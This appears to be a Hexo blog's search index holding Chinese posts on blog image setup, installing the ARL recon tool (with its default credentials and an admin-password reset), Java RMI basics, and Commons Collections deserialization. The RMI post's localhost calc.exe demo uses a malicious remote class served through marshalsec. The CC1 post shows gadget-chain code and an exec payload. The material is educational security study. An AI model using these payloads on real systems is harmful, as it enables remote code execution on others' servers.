<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hexo+Typora+github搭建的博客优雅的上传图片</title>
    <url>/2024/05/24/Hexo-Typora-github%E6%90%AD%E5%BB%BA%E7%9A%84%E5%8D%9A%E5%AE%A2%E4%BC%98%E9%9B%85%E7%9A%84%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在我们辛辛苦苦搭建了博客之后，发现成功搭建原来只是第一步，在写博客的过程中，发现图片粘贴到md文档了，但是上传后图片路径却不对了。在github.io的博客上面无法显示。因此此文章介绍了如何利用粘贴图片的方式，快速的完成博客内容而且图片还不会不显示。</p>
<h3 id="版本介绍"><a href="#版本介绍" class="headerlink" title="版本介绍"></a>版本介绍</h3><p>各个插件或程序的版本</p>
<p>Hexo: 7.2.0</p>
<p>Typora: 0.9.95 (Windows)</p>
<p>Node.js: 20.9.0</p>
<span id="more"></span>

<h3 id="设置Typora"><a href="#设置Typora" class="headerlink" title="设置Typora"></a>设置Typora</h3><p>打开左上角的 “文件-&gt;偏好设置-&gt;图像”，将配置”插入图片时”设置成如下图的配置（.&#x2F;${filename}表示当前文件名）：</p>
<p><img src="/2024/05/24/Hexo-Typora-github%E6%90%AD%E5%BB%BA%E7%9A%84%E5%8D%9A%E5%AE%A2%E4%BC%98%E9%9B%85%E7%9A%84%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87/image-20240524135639669.png" alt="image-20240524135639669"></p>
<h3 id="设置Hexo根目录配置"><a href="#设置Hexo根目录配置" class="headerlink" title="设置Hexo根目录配置"></a>设置Hexo根目录配置</h3><p>在Hexo根目录下打开配置文件_config.yml文件,将文件中的”post_asset_folder”设置为true,这样每次在我们用hexo new post “xxxx”命令创建一篇文章后，都会创建一篇跟文章名字相同的文件夹。这个文件夹刚好可以存放我们博文所需要的图片。</p>
<p>修改配置之前需要下载插件：npm install <a href="https://github.com/CodeFalling/hexo-asset-image">https://github.com/CodeFalling/hexo-asset-image</a> –save </p>
<p><img src="/2024/05/24/Hexo-Typora-github%E6%90%AD%E5%BB%BA%E7%9A%84%E5%8D%9A%E5%AE%A2%E4%BC%98%E9%9B%85%E7%9A%84%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87/image-20240524140228419.png" alt="image-20240524140228419"></p>
<p>截图工具：微信（Alt+A）非常便捷，截完图后会自动复制在剪切板，写文章时，截图后直接ctrl+v粘贴在文章里,粘贴后会自动存放在我们博文同名的目录里面。</p>
<p><img src="/2024/05/24/Hexo-Typora-github%E6%90%AD%E5%BB%BA%E7%9A%84%E5%8D%9A%E5%AE%A2%E4%BC%98%E9%9B%85%E7%9A%84%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87/image-20240524141738333.png" alt="image-20240524141738333"></p>
<p>hexo s预览一下文章可以看到图片上传成功：</p>
<p><img src="/2024/05/24/Hexo-Typora-github%E6%90%AD%E5%BB%BA%E7%9A%84%E5%8D%9A%E5%AE%A2%E4%BC%98%E9%9B%85%E7%9A%84%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87/image-20240524141122243.png" alt="image-20240524141122243"></p>
<p>hexo d -g上传到github.io,成功上传：</p>
<p><img src="/2024/05/24/Hexo-Typora-github%E6%90%AD%E5%BB%BA%E7%9A%84%E5%8D%9A%E5%AE%A2%E4%BC%98%E9%9B%85%E7%9A%84%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87/image-20240524141554678.png" alt="image-20240524141554678"></p>
]]></content>
      <tags>
        <tag>博客配置</tag>
      </tags>
  </entry>
  <entry>
    <title>你好hexo</title>
    <url>/2024/05/23/%E4%BD%A0%E5%A5%BDhexo/</url>
    <content><![CDATA[<h2 id="请输入密码查看文章，里面有大惊喜"><a href="#请输入密码查看文章，里面有大惊喜" class="headerlink" title="请输入密码查看文章，里面有大惊喜"></a>请输入密码查看文章，里面有大惊喜</h2><span id="more"></span>





<p>试出来了没，送你个弱口令漏洞</p>
]]></content>
      <categories>
        <category>加密文章</category>
      </categories>
      <tags>
        <tag>加密文章</tag>
      </tags>
  </entry>
  <entry>
    <title>利用本地的docker镜像安装ARL灯塔系统</title>
    <url>/2024/05/25/%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0%E7%9A%84docker%E9%95%9C%E5%83%8F%E5%AE%89%E8%A3%85ARL%E7%81%AF%E5%A1%94%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>ARl前些日子痛苦下架了，身为一个资深的脚本小子，怎么能忍受没有灯塔系统使用呢。因此我把arl的docker镜像文件脱了下来。</p>
<span id="more"></span>

<p>我把它放在了网盘里<a href="https://pan.baidu.com/s/1QjyGcdyDBpA0ambtNCOwqQ">百度网盘链接</a></p>
<p>提取码：g2rg</p>
<p>下载下来后解压可以看到文件夹中有arl-docker.tar文件，这个就是arl的镜像文件</p>
<p><img src="/2024/05/25/%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0%E7%9A%84docker%E9%95%9C%E5%83%8F%E5%AE%89%E8%A3%85ARL%E7%81%AF%E5%A1%94%E7%B3%BB%E7%BB%9F/image-20240525152909345.png" alt="image-20240525152909345"></p>
<h2 id="利用Ubuntu来安装ARL"><a href="#利用Ubuntu来安装ARL" class="headerlink" title="利用Ubuntu来安装ARL"></a>利用Ubuntu来安装ARL</h2><p><em>docker部署镜像：</em></p>
<p>docker load -i arl-docker.tar </p>
<p><img src="/2024/05/25/%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0%E7%9A%84docker%E9%95%9C%E5%83%8F%E5%AE%89%E8%A3%85ARL%E7%81%AF%E5%A1%94%E7%B3%BB%E7%BB%9F/image-20240525153322242.png" alt="image-20240525153322242"></p>
<p>docker images，查看部署情况：</p>
<p><img src="/2024/05/25/%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0%E7%9A%84docker%E9%95%9C%E5%83%8F%E5%AE%89%E8%A3%85ARL%E7%81%AF%E5%A1%94%E7%B3%BB%E7%BB%9F/image-20240525153354070.png" alt="image-20240525153354070"></p>
<p>docker tag 82 tophant&#x2F;arl:latest，将镜像名字更改为tophant&#x2F;arl:latest。（82为image id）</p>
<p><img src="/2024/05/25/%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0%E7%9A%84docker%E9%95%9C%E5%83%8F%E5%AE%89%E8%A3%85ARL%E7%81%AF%E5%A1%94%E7%B3%BB%E7%BB%9F/image-20240525153459725.png" alt="image-20240525153459725"></p>
<p>cd docker_arl   进入docker_arl目录</p>
<p><img src="/2024/05/25/%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0%E7%9A%84docker%E9%95%9C%E5%83%8F%E5%AE%89%E8%A3%85ARL%E7%81%AF%E5%A1%94%E7%B3%BB%E7%BB%9F/image-20240525154048223.png" alt="image-20240525154048223"></p>
<p>运行以下命令来手动创建arl_db卷 docker volume create –name&#x3D;arl_db</p>
<p><img src="/2024/05/25/%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0%E7%9A%84docker%E9%95%9C%E5%83%8F%E5%AE%89%E8%A3%85ARL%E7%81%AF%E5%A1%94%E7%B3%BB%E7%BB%9F/image-20240525153625773.png" alt="image-20240525153625773"></p>
<p>运行docker-compose up -d</p>
<p><img src="/2024/05/25/%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0%E7%9A%84docker%E9%95%9C%E5%83%8F%E5%AE%89%E8%A3%85ARL%E7%81%AF%E5%A1%94%E7%B3%BB%E7%BB%9F/image-20240525153743677.png" alt="image-20240525153743677"></p>
<p>访问灯塔网站,配置文件中的config-docker.yaml中已经将端口配置为50123：</p>
<p><img src="/2024/05/25/%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0%E7%9A%84docker%E9%95%9C%E5%83%8F%E5%AE%89%E8%A3%85ARL%E7%81%AF%E5%A1%94%E7%B3%BB%E7%BB%9F/image-20240525155603317.png" alt="image-20240525155603317"></p>
<p>默认密码admin&#x2F;arlpass</p>
<p>如果密码不对需要修改，利用如下代码进行修改，下面的例子是将密码修改为admin123：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -ti arl_mongodb mongo -u admin -p admin</span><br><span class="line">use arl</span><br><span class="line">db.user.drop()</span><br><span class="line">db.user.insert(&#123; username: &#x27;admin&#x27;,  password: hex_md5(&#x27;arlsalt!@#&#x27;+&#x27;admin123&#x27;) &#125;)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈RMI的基本使用</title>
    <url>/2024/06/24/%E6%B5%85%E8%B0%88RMI%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="RMI描述"><a href="#RMI描述" class="headerlink" title="RMI描述"></a>RMI描述</h2><p>RMI全称是Remote Method Invocation，远程方法调用。从这个名字就可以看出，他的目标和RPC其实是类似的，是让某个Java虚拟机上的对象调⽤用另⼀一个Java虚拟机中对象上的⽅方法，只不不过RMI是Java独有的⼀一种机制。</p>
<h2 id="如何使用RMI"><a href="#如何使用RMI" class="headerlink" title="如何使用RMI"></a>如何使用RMI</h2><h3 id="远程类"><a href="#远程类" class="headerlink" title="远程类"></a>远程类</h3><p>远程类需要包括接口以及实现类，下面是远程类的例子：</p>
<p>SayHello接口需要继承Remote,并且定义好我们要调用的方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package method;</span><br><span class="line"></span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @author Tonny</span><br><span class="line"> * @version 2021.2</span><br><span class="line"> * @date 2023/7/6 11:14</span><br><span class="line"> */</span><br><span class="line">public interface SayHello extends Remote &#123;</span><br><span class="line">    public String sayHello(String name) throws RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>接口实现类SayHelloImpl，继承UnicastRemoteObject类并且实现SayHello接口:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Tonny</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> 2021.2</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2023/7/6 11:17</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SayHelloImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">SayHello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SayHelloImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello i am&quot;</span>+name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/24/%E6%B5%85%E8%B0%88RMI%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20240624160627658.png" alt="image-20240624160627658"></p>
<h3 id="开启RMI服务端"><a href="#开启RMI服务端" class="headerlink" title="开启RMI服务端"></a>开启RMI服务端</h3><p>调用远程方法需要将远程的RMI服务打开，并且利用Naming.bind()方法将类绑定至服务端（地址）。<strong>注：registry.bind()也可以。</strong></p>
<p>RMI服务端代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> rmiserver;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> method.SayHellpImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Tonny</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> 2021.2</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2023/7/6 11:22</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException, MalformedURLException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;远程方法调用ing&quot;</span>);</span><br><span class="line">        <span class="comment">//创建远程对象</span></span><br><span class="line">        SayHellpImpl sayHello= <span class="keyword">new</span> <span class="title class_">SayHellpImpl</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">&quot;sayhello&quot;</span>,sayHello);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上述代码其实很简单，主要就是三句：</p>
<p>1、SayHellpImpl sayHello&#x3D; new SayHellpImpl(); 将SayHellpImpl类实例化。</p>
<p>2、Registry registry &#x3D; LocateRegistry.createRegistry(1099); 绑定服务端端口1099</p>
<p>3、Naming.bind(“sayhello”,sayHello); 将实例化的对象绑定至此链接。（第一个参数可以是：rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;sayhello，由于我们服务开的是本机127.0.0.1，所以默认可以不写）</p>
<p>运行该服务端：</p>
<p><img src="/2024/06/24/%E6%B5%85%E8%B0%88RMI%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20240624160756296.png" alt="image-20240624160756296"></p>
<h3 id="客户端代码"><a href="#客户端代码" class="headerlink" title="客户端代码"></a>客户端代码</h3><p>客户端需要的功能就是利用Naming.lookup()方法去执行远程方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> rmiclient;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> method.SayHello;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Tonny</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> 2021.2</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2023/7/6 11:27</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotBoundException, RemoteException, MalformedURLException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">SayHello</span> <span class="variable">sayhello</span> <span class="operator">=</span> (SayHello) Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/sayhello&quot;</span>);</span><br><span class="line">        System.out.println(sayhello.sayHello(<span class="string">&quot;小白&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>成功执行sayHello()方法</p>
<p><img src="/2024/06/24/%E6%B5%85%E8%B0%88RMI%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20240624161041169.png" alt="image-20240624161041169"></p>
<h2 id="命令执行利用"><a href="#命令执行利用" class="headerlink" title="命令执行利用"></a>命令执行利用</h2><p>我们可以将SayHelloImpl类中写一个恶意方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package method;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @author Tonny</span><br><span class="line"> * @version 2021.2</span><br><span class="line"> * @date 2023/7/6 11:17</span><br><span class="line"> */</span><br><span class="line">public class SayHelloImpl extends UnicastRemoteObject implements SayHello &#123;</span><br><span class="line">    public SayHelloImpl() throws RemoteException &#123;</span><br><span class="line">        super();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String sayHello(String name) throws RemoteException &#123;</span><br><span class="line">        return &quot;Hello i am&quot;+name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void rce() throws Exception&#123;</span><br><span class="line">        Class&lt;?&gt; runtimeClass = Runtime.class;</span><br><span class="line"></span><br><span class="line">        // 获取 getRuntime 方法</span><br><span class="line">        Method getRuntimeMethod = runtimeClass.getMethod(&quot;getRuntime&quot;);</span><br><span class="line"></span><br><span class="line">        // 调用 getRuntime 方法</span><br><span class="line">        Object runtime = getRuntimeMethod.invoke(null);</span><br><span class="line"></span><br><span class="line">        // 获取 exec 方法</span><br><span class="line">        Method execMethod = runtimeClass.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line"></span><br><span class="line">        // 调用 exec 方法执行 calc.exe</span><br><span class="line">        execMethod.invoke(runtime, &quot;calc.exe&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中rce()方法是反射实现的恶意方法。</p>
<p>服务端代码修改：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System.out.println(&quot;远程方法调用ing&quot;);</span><br><span class="line">//创建远程对象</span><br><span class="line">SayHelloImpl rce= new SayHelloImpl();</span><br><span class="line">Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">Naming.bind(&quot;rce&quot;,rce);</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/24/%E6%B5%85%E8%B0%88RMI%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20240624164728373.png" alt="image-20240624164728373"></p>
<p>客户端调用rce()方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SayHello rce = (SayHello) Naming.lookup(&quot;rmi://127.0.0.1:1099/rce&quot;);</span><br><span class="line">       rce.rce();</span><br></pre></td></tr></table></figure>

<p>运行后执行命令：</p>
<p><img src="/2024/06/24/%E6%B5%85%E8%B0%88RMI%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20240624164819480.png" alt="image-20240624164819480"></p>
<h2 id="工具利用"><a href="#工具利用" class="headerlink" title="工具利用"></a>工具利用</h2><p>说了那么多，工具小子当然也不能离开工具的使用。~~~~</p>
<p>推荐工具<a href="https://github.com/mbechler/marshalsec">marshalsec-0.0.3-SNAPSHOT-all.jar</a></p>
<p>也可以使用编译好的<a href="%E9%93%BE%E6%8E%A5%EF%BC%9Ahttps://pan.baidu.com/s/1KWUguwjNd4lswYMfBj6e7g?pwd=7i6f">百度网盘marshalsec-0.0.3-SNAPSHOT-all.jar</a></p>
<p>提取码：7i6f </p>
<p>一、先将Exploit.java恶意类编译后放在marshalsec-0.0.3-SNAPSHOT-all.jar目录下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Exploit &#123;</span><br><span class="line">    public Exploit()&#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc.exe&quot;);</span><br><span class="line">        &#125;catch(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] argv)&#123;</span><br><span class="line">        Exploit e = new Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/24/%E6%B5%85%E8%B0%88RMI%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20240624165922661.png" alt="image-20240624165922661"></p>
<p>利用python在此目录下开启一个http服务：</p>
<p>python -m http.server 1111</p>
<p><img src="/2024/06/24/%E6%B5%85%E8%B0%88RMI%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20240624165845365.png" alt="image-20240624165845365"></p>
<p>利用marshalsec-0.0.3-SNAPSHOT-all.jar打开RMI服务，并且将恶意类绑定：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://127.0.0.1:1111/#Exploit&quot; 9999</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/24/%E6%B5%85%E8%B0%88RMI%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20240624170441073.png" alt="image-20240624170441073"></p>
<p>只需要客户端执行lookup()方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class RmiClient &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        Naming.lookup(&quot;rmi://127.0.0.1:9999/Exploit&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/24/%E6%B5%85%E8%B0%88RMI%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20240624170612672.png" alt="image-20240624170612672"></p>
<p>发现成功访问了RMI服务，并执行远程恶意类：</p>
<p><img src="/2024/06/24/%E6%B5%85%E8%B0%88RMI%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20240624170922255.png" alt="image-20240624170922255"></p>
]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java Commons Collections反序列化漏洞链分析（CC1链）</title>
    <url>/2025/03/13/Java-Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%88CC1%E9%93%BE%EF%BC%89/</url>
    <content><![CDATA[<h2 id="0x00-漏洞概述"><a href="#0x00-漏洞概述" class="headerlink" title="0x00 漏洞概述"></a>0x00 漏洞概述</h2><p>Apache Commons Collections是Java中广泛使用的基础库，2015年Gabriel Lawrence和Chris Frohoff在《Marshalling Pickles》报告中披露了该库存在的反序列化远程代码执行漏洞（CVE-2015-4852）。攻击者通过构造恶意序列化数据，可在目标服务器上执行任意命令。</p>
<p><strong>影响版本</strong>：Apache Commons Collections &lt;&#x3D; 3.2.1 &#x2F; &lt;&#x3D; 4.0.0</p>
<h2 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h2><p>Java反序列化漏洞的核心在于：当应用对不可信的序列化数据执行<code>readObject()</code>反序列化操作时，攻击者通过构造特殊的对象关系链（Gadget Chain），触发恶意代码执行。</p>
<p>Commons Collections中以下关键类被利用：</p>
<ul>
<li><code>InvokerTransformer</code>：实现反射方法调用</li>
<li><code>ChainedTransformer</code>：形成多级Transformer调用链</li>
<li><code>LazyMap/LazyMap.decorate</code>：延迟执行机制</li>
<li><code>AnnotationInvocationHandler</code>：JDK代理触发点</li>
</ul>
<span id="more"></span>

<h2 id="0x02-利用链分析"><a href="#0x02-利用链分析" class="headerlink" title="0x02 利用链分析"></a>0x02 利用链分析</h2><p>完整调用链如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">-&gt; AnnotationInvocationHandler.readObject()</span><br><span class="line">-&gt; memberValues.entrySet()</span><br><span class="line">-&gt; LazyMap.get()</span><br><span class="line">-&gt; ChainedTransformer.transform()</span><br><span class="line">-&gt; InvokerTransformer.transform()</span><br><span class="line">-&gt; Runtime.exec()</span><br></pre></td></tr></table></figure>



<h3 id="关键类分析"><a href="#关键类分析" class="headerlink" title="关键类分析"></a>关键类分析</h3><h4 id="1-InvokerTransformer"><a href="#1-InvokerTransformer" class="headerlink" title="1. InvokerTransformer"></a>1. InvokerTransformer</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="comment">// 通过反射执行指定方法</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">        <span class="keyword">return</span> cls.getMethod(iMethodName).invoke(input, iArgs);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过反射机制可调用任意方法，例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>

<h4 id="2-ChainedTransformer"><a href="#2-ChainedTransformer" class="headerlink" title="2. ChainedTransformer"></a>2. ChainedTransformer</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="comment">// 链式执行多个Transformer</span></span><br><span class="line">        <span class="keyword">for</span> (Transformer transformer : iTransformers) &#123;</span><br><span class="line">            object = transformer.transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用于将多个Transformer连接成执行链，典型构造：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, ...),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, ...),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, ...)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="3-LazyMap"><a href="#3-LazyMap" class="headerlink" title="3. LazyMap"></a>3. LazyMap</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMap</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapDecorator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">            <span class="comment">// 触发factory.transform()</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">            <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

